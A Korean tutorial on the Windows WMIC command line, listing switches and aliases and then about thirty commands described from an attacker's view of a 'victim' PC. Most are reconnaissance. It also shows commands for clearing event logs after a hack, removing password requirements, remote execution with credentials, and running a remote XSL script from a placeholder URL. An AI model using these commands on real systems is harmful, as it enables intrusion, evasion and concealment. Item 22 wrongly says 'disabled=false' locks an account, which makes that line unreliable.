# WMIC
##### 원작자: 문광일 PM
##### 링크: [KOROMOON][koromoonlink]
[koromoonlink]: https://koromoon.blogspot.com/2018/11/wmic.html "Go koromoon"
##### 작성자: 김평일 대리
##### 작성일자: 2024년 4월 18일

<br>
<br>

## (1) WMIC 명령어

WMI(Windows Management Instrumentation)란 엔터프라이즈 네트워크에서 관리정보를 액세스하고 공유하는 표준을 만들기 위하여 Microsoft에서 구현한 것을 말함.
WMIC(Windows Management Instrumentation Command-line)란 WMI에 대한 간단한 명령줄 인터페이스를 제공하므로 WMI를 사용하여 윈도우를 실행하는 컴퓨터를 관리하는 명령어임.<br>
Shell 및 유틸리티 명령과 상호 작용하여 한 컴퓨터부터 다수의 컴퓨터까지 원격으로 관리할 수 있으며 관리 스크립팅을 통하여 자동화까지 가능함.<br>
WMIC는 기본적으로 Windows XP 이상에서만 로드됨.<br>

<br>
<br>

## (2) WMIC 명령어 도움말

</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/0238e315-bef1-4a15-bb29-cb108d72647a)</div>

<br>

다음 전역 스위치를 사용할 수 있음<br>

|명령어|설명|
|---------------------------|------------------|
|/NAMESPACE&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;|별칭이 작동하는 네임 스페이스의 경로&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;|
|/ROLE|별칭 정의가 들어있는 역할의 경로|
|/NODE|별칭 서버가 작동함.|
|/IMPLEVEL|클라이언트 가장(impersonation) 레벨|
|/AUTHLEVEL|클라이언트 인증 레벨|
|/LOCALE|클라이언트가 사용해야 하는 언어 ID|
|/PRIVILEGES|모든 권한을 사용 또는 미사용 설정|
|/TRACE|stderr 에 대한 디버깅 정보를 출력함.|
|/RECORD|모든 입력 명령 및 출력을 기록함.|
|/INTERACTIVE|대화식 모드를 설정하거나 재설정함.|
|/FAILFAST|FailFast 모드를 설정하거나 재설정함.|
|/USER|세선 중에 사용되는 사용자|
|/PASSWORD|세선 로그인에 사용할 암호|
|/OUTPUT|출력 경로 재지정을 위한 모드를 저정함.|
|/APPEND|출력 경로 재지정을 위한 모드를 저정함.|
|/AGGREGATE|집계 모드를 설정 또는 재설정함.|
|/AUTHORITY|연결에 대한 <권한 타입> 을 지정함.|
|/?[:<BRIEF|FULL>]|사용 정보|

<br>

특정 글로벌 스위치에 대한 자세한 내용을 보려면 다음을 입력 : switch-name /?<br>

<br>

|명령어|설명|
|------|---|
|ALIAS|로컬 시스템에서 사용 가능한 별칭에 대한 액세스|
|BASEBOARD|베이스 보드(마더 보드 또는 시스템 보드) 관리|
|BIOS|기본 입/출력 서비스(BIOS) 관리|
|BOOTCONFIG|부팅 구성 관리|
|CDROM|CD-ROM 관리|
|COMPUTERSYSTEM|컴퓨터 시스템 관리|
|CPU|CPU 관리|
|CSPRODUCT|SMBIOS 의 컴퓨터 시스템 제품 정보|
|DATAFILE|데이터파일(DataFile) 관리|
|DCOMAPP|DCOM 응용 프로그램 관리|
|DESKTOP|사용자의 데스크톱 관리|
|DESKTOPMONITOR|데스크톱 모니터 관리|
|DEVICEMEMORYADDRESS|장치 메모리 주소 관리|
|DISKDRIVE|물리적 디스크 드라이브 관리|
|DISKQUOTA|NTFS 볼륨의 디스크 공간 사용|
|DMACHANNEL|직접 메모리 액세스(DMA) 채널 관리|
|ENVIRONMENT|시스템 환경 설정 관리|
|FSDIR|파일 시스템 디렉토리 항목 관리|
|GROUP|그룹 계정 관리|
|IDECONTROLLER|IDE 컨트롤러 관리|
|IRQ|인터럽트 요청 라인(IRQ) 관리|
|JOB|일정 서비스를 사용하여 예약된 작업에 대한 액세스를 제공|
|LOADORDER|실행 의존성을 정의하는 시스템 서비스의 관리|
|LOGICALDISK|로컬 저장 장치 관리|
|LOGON|로그온 세션|
|MEMCACHE|캐시 메모리 관리|
|MEMORYCHIP|메모리 칩 정보 제공|
|MEMPHYSICAL|컴퓨터 시스템의 물리적 메모리 관리|
|NETCLIENT|네트워크 클라이언트 관리|
|NETLOGIN|(특정 사용자의) 네트워크 로그인 정보 관리|
|NETPROTOCOL|프로토콜(및 해당 네트워크 특성) 관리|
|NETUSE|활성 네트워크 연결 관리||
|NIC|네트워크 인터페이스 컨트롤러(NIC) 관리|
|NICCONFIG|네트워크 어댑터 관리|
|NTDOMAIN|NT 도메인 관리|
|NTEVENT|NT 이벤트 로그의 항목|
|NTEVENTLOG|NT 이벤트 로그 파일 관리|
|ONBOARDDEVICE&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;|마더 보드(시스템 보드)에 내장된 일반 어댑터 장치의 관리|
|OS|설치된 운영 체제 관리|
|PAGEFILE|가상 메모리 파일 스와핑 관리|
|PAGEFILESET|페이지 파일 설정 관리|
|PARTITION|물리적 디스크의 파티션된 영역 관리|
|PORT|입출력 포트 관리|
|PORTCONNECTOR|물리적 연결 포트 관리|
|PRINTER|프린터 장치 관리|
|PRINTERCONFIG|프린터 장치 구성 관리|
|PRINTJOB|작업 관리를 인쇄|
|PROCESS|프로세스 관리|
|PRODUCT|설치 패키지 작업 관리|
|QFE|빠른 수정 엔지니어링|
|QUOTASETTING|볼륨의 디스크 할당량에 대한 설정 정보|
|RDACCOUNT|원격 데스크톱 연결 권한 관리|
|RDNIC|특정 네트워크 어댑터의 원격 데스크톱 연결 관리|
|RDPERMISSIONS|특정 원격 데스크톱 연결에 대한 사용 권한|
|RDTOGGLE|원격 데스크톱 수신기를 원격으로 켜고 끔|
|RECOVEROS|운영 체제가 실패할 때 메모리에서 수집되는 정보|
|REGISTRY|컴퓨터 시스템 레지스트리 관리|
|SCSICONTROLLER|SCSI 컨트롤러 관리|
|SERVER|서버 정보 관리|
|SERVICE|서비스 응용 프로그램 관리|
|SHADOWCOPY|섀도 복사본(Shadow Copy) 관리|
|SHADOWSTORAGE|섀도 복사본(Shadow Copy) 저장 영역 관리|
|SHARE|공유 자원 관리|
|SOFTWAREELEMENT|시스템에 설치된 소프트웨어 제품 요소의 관리|
|SOFTWAREFEATURE|SoftwareElement 의 소프트웨어 제품 하위 집합 관리|
|SOUNDDEV|사운드 장치 관리|
|STARTUP|사용자가 컴퓨터 시스템에 로그온할 때 자동으로 실행되는 명령어의 관리|
|SYSACCOUNT|시스템 계정 관리|
|SYSDRIVER|기본 서비스를 위한 시스템 드라이버 관리|
|SYSTEMENCLOSURE|물리적 시스템 인클로저 관리|
|SYSTEMSLOT|포트, 슬롯, 주변 장치 및 독점적인 연결 지점을 포함한 물리적 연결 지점 관리|
|TAPEDRIVE|테이프 드라이브 관리|
|TEMPERATURE|온도 센서(전자 온도계)의 데이터 관리|
|TIMEZONE|시간대 데이터 관리|
|UPS|무정전 전원 공급 장치(UPS) 관리|
|USERACCOUNT|사용자 계정 관리|
|VOLTAGE|전압 센서(전자 전압계) 데이터 관리|
|VOLUME|로컬 스토리지 볼륨 관리|
|VOLUMEQUOTASETTING|디스크 할당량 설정을 특정 디스크 볼륨과 연관|
|VOLUMEUSERQUOTA|사용자 별로 저장 용량 할당량 관리|
|WMISET|WMI 서비스 운영 매개 변수 관리|

<br>

특정 별칭에 대한 자세한 내용을 보려면 다음을 입력 : alias /?<br>

<br>

|명령어|설명|
|------|---|
|CLASS|전체 WMI 스키마로 이스케이프(Escapes)|
|PATH|전체 WMI 개체 경로로 이스케이프(Escapes)&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;|
|CONTEXT|모든 글로벌 스위치의 상태를 표시|
|QUIT/EXIT&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;|프로그램 종료|

<br>

CLASS/PATH/CONTEXT 에 대한 자세한 내용은 다음을 입력 : (CLASS | PATH | CONTEXT) /?<br>

<br>
<br>

## (3) WMIC 명령어 사용예

공격자가 원격 PC에서 WMIC 명령어를 사용하여 막대한 양의 정보를 열거하거나 명령어 실행 등을 할 수 있음.<br>

1. 시스템 역할, 사용자 이름 및 제조업체 가져오기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/e3a6ae51-e4b6-451c-95ec-aaa7a2d6d8d0)</div>

Roles - 피해자 시스템이 워크스테이션, 서버, 브라우저 등과 같은 모든 역할을 검색함.<br>
Manufacturer - 시스템 제조사의 특정 모델에 특정 취약점이 존재하는 경우가 있음. 해당 정보를 찾기 위해서 검색함.<br>
UserName - 관리자와 일반 사용자를 구분할 수 있으므로 시스템의 사용자 이름 정보가 필요함.<br>

**/format:list - 출력을 목록 형식으로 출력함.**<br>

`wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles /format:list`<br>
<br>

2. SID 가져오기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/13c086fa-6a7a-4acc-a233-1f4010a02e8a)</div>

계정 이름, 도메인, 로컬 그룹 회원 상태, SID 및 상태를 출력함.<br>

`wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status`<br>
<br>

3.  프로세스 만들기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/e3620d86-e4cb-4eb7-a543-474e227d7193)</div>

프로세스 별칭을 사용하여 피해자 시스템에서 프로세스를 만들 수 있음.<br>
이는 백도어를 실행하거나 피해자 시스템의 메모리를 가득 채우거나, 프로세스를 생성할 뿐만 아니라 Process ID 를 제공하며 필요에 따라 프로세스를 조작할 수 있음.<br>
또한, 악의적인 해킹에도 쓰이는 데 프로세스 생성을 이용하여 백신 삭제에도 이용됨.<br>
아래 명령어는 계산기를 실행시키는 예임.<br>

`wmic process call create "calc.exe"`<br>

</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/1d8d70bd-05f7-4745-8eca-7a395cd3752b)</div>
<br>

4.프로세스 우선 순위 변경<br>
프로세스 별칭을 사용하여 피해자 시스템에서 실행 중인 프로세스의 우선 순위를 변경할 수 있음.<br>
프로세스의 우선 순위를 낮추면 해당 프로그램이 손상될수 있으며 증가하면 전체 시스템이 손상될 수 있음.<br>

`wmic process where name="explorer.exe" call set priority 64`<br>
<br>

5. 프로세스 종료<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/377ba365-8e2b-4f01-8c69-50c5bad2d48e)</div>

프로세스 별칭을 사용하여 피해자 시스템에서 실행 중인 프로세스를 종료함.<br>
아래 명령어는 계산기를 종료시키는 예임.<br>

`wmic process where name="calc.exe" call terminate`<br>
<br>

6. 실행 파일 목록 가져오기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/60f7fabe-a5ee-42c7-9682-caf39e61a1ac)</div>

아래 명령어는 윈도우의 실행 파일이 아닌 실행 파일의 위치를 포함하는 목록을 얻음.<br>

`wmic process where "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath`<br>
<br>

7. 폴더 속성 가져오기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/3888926e-02d6-4ef3-b900-d92a5ceda32e)</div>

대상 시스템의 폴더에 대한 기본 정보를 추출하기 위해 fsdir 별칭을 사용할 수 있음.<br>
폴더에 대한 CompressionMethod, 생성 날짜, 파일 크기, 읽기 가능 여부, 쓰기 가능 여부, 시스템 파일 여부, 암호화 여부, 암호화 유형 등을 출력할 수 있음.<br>

`wmic fsdir "c:\\KOROMOON" get /format:list`<br>
<br>

8. 파일 속성 가져오기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/6fd33a43-86b0-44fd-83ee-4d7f2f5d2bc3)</div>

대상 시스템의 파일에 대한 기본 정보를 추출하기 위해 datafile 별칭을 사용할 수 있음.<br>
파일에 대한 CompressionMethod, 생성 날짜, 파일 크기, 읽기 가능 여부, 쓰기 가능 여부, 시스템 파일 여부, 암호화 여부, 암호화 유형 등을 출력할 수 있음.<br>

`wmic datafile where name='c:\\KOROMOON\\hacker.txt' get /format:list`<br>
<br>

9. 시스템 파일 찾기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/99bb349a-d37b-4162-b0fc-9a46451b9b9c)</div>

Temp 폴더, Win 폴더 등 모든 중요한 시스템 파일의 경로를 출력함.<br>

`wmic environment get Description, VariableValue`<br>
<br>

10. 설치된 응용 프로그램 목록 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/fe5c5327-3ac1-4197-b5d1-feb3699d8b81)</div>

피해자 시스템에 설치된 응용 프로그램 또는 소프트웨어 목록을 출력함.<br>

`wmic product get name`<br>
<br>

11. 실행 중인 서비스 목록보기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/c7f10060-5906-4371-a061-7dfb9d3bcf48)</div>

실행중인 서비스 목록과 자동으로 시작되는 서비스 목록을 가져옴.<br>
시작 모드에서 "자동" 또는 "수동"으로 표시되며 상태 표시는 "실행 중"으로 표시됨.<br>

`wmic service where (state="running") get caption, name, startmode`<br>
<br>

12. 시작 서비스 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/12393a1b-c2a9-4818-a17b-c530f6a3988d)</div>

시작 중에 실행되는 모든 서비스에 대한 startup 별칭을 사용하여 시작 서비스를 출력함.<br>
`wmic startup get Caption, Command`<br>
<br>

13. 시스템 드라이버 정보 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/ca5d37b5-f798-487c-904a-132e981fd167)</div>

sysdrive 별칭을 사용하여 이름, 경로, 서비스 유형과 같은 드라이버 세부 정보를 출력함.<br>
해당 명령어를 통해 드라이버 파일의 경로, 상태(실행 중 또는 중지됨),  유형(커널 또는 파일시스템) 등을 출력함.<br>

`wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list`<br>
<br>

14. OS 세부 정보 얻기<br>

시스템이 설정된 시간대를 이용하여 피해자의 위치를 열거할 수 있음. 이는 os 별칭을 사용하여 출력함.<br>
또한, os 별칭을 사용하여 마지막 부팅 업데이트 시간과 등록된 사용자 수, 프로세스 수, 물리 또는 가상 메모리에 대한 정보를 얻음.<br>

`wmic os get CurrentTimeZone, FreePhysicalMemory, FreeVirtualMemory, LastBootUpdate, NumberofProcesses, NumberofUsers, Organization, RegisteredUsers, Status /format:list`<br>
<br>

15. 메인보드 세부 정보 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/161a7239-d438-41a8-b00b-928bdea99f4b)</div>

피해자 시스템의 메인보드 세부 정보를 출력하기 위해 baseboard 별칭을 사용함.<br>
출력되는 정보는 메인보드 제조업체, 일련 번호 및 버전임.<br>

`wmic baseboard get Manufacturer, Product, SerialNumber, Version`<br>
<br>

16. BIOS 일력 번호 가져오기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/8130e6ba-6a6e-45f3-87ee-1c99c432e639)</div>

피해자 시스템의 BIOS 세부 정보를 출력하기 위해 bios 별칭을 사용함.<br>
아래 명령어는 피해자 시스템의 BIOS 일련 번호를 확인함.<br>

`wmic bios get serialNumber`<br>
<br>

17. 하드디스크 정보 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/2660f6e4-397b-4063-aeff-b7c21af1340c)</div>

diskdrive 별칭을 사용하여 시스템 하드디스크에 대한 정보를 출력함.<br>
해당 명령어를 통해 인터페이스 유형, 제조업체 및 모델명을 확인함.<br>

`wmic diskdrive get Name, Manufacturer, Model, InterfaceType, MediaLoaded, MediaType /format:list`<br>
<br>

18. 하드디스크 파티션 정보 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/e3e246c2-737a-4841-bd75-3afadcd7112a)</div>

logicaldisk 별칭을 사용하여 하드디스크 파티션에 대한 정보를 출력함.<br>
해당 명령어을 통해 이름, 압축 상태, 파일 시스템(NTFS, FAT) 등을 출력함.<br>

`wmic logicaldisk where drivetype=3 get Name, Compressed, Description, FileSystem, FreeSpace, SupportsDiskQuotas, VolumeDirty, VolumeName`<br>
<br>

19. 메모리 캐시 정보 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/1a61b7dc-ad6b-419b-8b9f-a12d0e3289b8)</div>

memcache 별칭을 사용하여 메모리 캐시에 대한 정보를 출력함.<br>
해당 명령어를 통해 이름, 블록 크기, 목적 등을 알 수 있음.<br>

`wmic memcache get Name, BlockSize, Purpose, MaxCacheSize, Status`<br>
<br>

20. 메모리 칩 정보 얻기<br>

memorychip 별칭을 사용하여 RAM 에 대한 정보를 출력함.<br>
해당 명령어를 통해 RAM 을 제거하거나 물리적으로 시스템 근처에 있는 RAM 의 일련 번호를 출력함.<br>

`wmic memorychip get PartNumber, SerialNumber`<br>
<br>

21. 피해자 시스템이 호스트 OS 인지 가상 이미지인지 확인하기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/8b2c397d-c499-48d8-98a9-c9230e6b81df)</div>

아래 명령어는 피해자 시스템에 대한 정보를 확인할 수 있으며 Description 에서 호스트 OS 인지 가상 이미지인지 확인할 수 있음.<br>

`wmic onboarddevice get Description, DeviceType, Enabled, Status /format:list`<br>
<br>

22. 사용자 계정 잠그기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/651d9223-965f-4261-b308-03549f82374b)</div>

useraccount 별칭을 사용하여 특정 계정을 사용하지 못하도록 제한할 수 있음.<br>

`wmic useraccount where name='계정명' set disabled=false`<br>
<br>

23. 로깅을 위한 암호 요구 사항 제거<br>

useraccount 별칭을 사용하여 로그인할 때 특정 계정의 암호 요구 사항을 제거할 수 있음.<br>

`wmic useraccount where name='계정명' set PasswordRequired=false`<br>

24. 사용자 계정명 바꾸기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/5cd7d79c-62de-4a42-afeb-aa7805e08895)</div>

useraccount 별칭을 사용하여 계정명을 바꿀 수 있음.<br>

`wmic useraccount where name='계정명' rename 바꿀계정명`<br>
<br>

25. 사용자 암호를 변경하지 못하도록 제한<br>

useraccount 별칭을 사용하여 사용자 암호를 변경하지 못하도록 제한할 수 있음.<br>

`wmic useraccount where name='계정명' set passwordchangeable=false`<br>
<br>

26. 바이러스 백신 정보 얻기<br>
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/165347210/6a156d08-0044-46b0-b3f0-3114cd1eeb12)</div>

**희생자 시스템에 설치된 바이러스 백신과 그 위치 및 버전을 출력함.**<br>

`wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe`<br>
<br>

27.  시스템 로그 지우기<br>

nteventlog 별칭을 사용하여 시스템 로그를 삭제하는 데 사용할 수 있음.<br>

**log 이름을 언급한 다음 nteventlog 옵션을 사용하여 로그 파일을 지우는 아주 간단한 시스템 해킹후 주로 사용하는 명령어임.**<br>

`wmic nteventlog where filename='system' cleareventlog`<br>
<br>

28.  공격자는 원격호스트에 임의의 명령을 실행함.<br>

`wmic /node:[IP address] /user:"[user name]" /password:"[password]" process call create "cmd /c c:\Windows\System32\net.exe user"`<br>
<br>

29. 로컬 또는 원격에서 XSL 스크립트 호출<br>

**Windows Script Host 가 비활성화되거나 차단된 환경에서 유용함.**<br>

로컬 위치 : `wmic process list /FORMAT:koromoon.xsl`<br>

원격 위치 : `wmic os get /FORMAT:"https://example.com/koromoon.xsl"`<br>

<br>
